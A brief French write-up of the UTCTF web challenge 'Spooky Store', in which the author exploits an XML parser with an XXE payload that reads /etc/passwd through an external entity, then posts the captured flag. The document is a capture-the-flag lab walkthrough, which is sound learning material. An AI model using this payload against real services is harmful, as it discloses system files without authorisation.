# Write Up d'un challenge web UTCTF

Le challenge Spooky Store étais un classique site fais avec bootstrap, il permettais de récuperer les cordonné de certains endroids via des documents xml, j'ai donc tout simplement tenté une XXE (XML External Entity) avec le payloads suivant: 
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><locationCheck><productId>&test;</productId></locationCheck>
``` 
Et ça m'a sorti le flag tout simple :) 

Flag: `utflag{n3xt_y3ar_go1ng_bl1nd}`
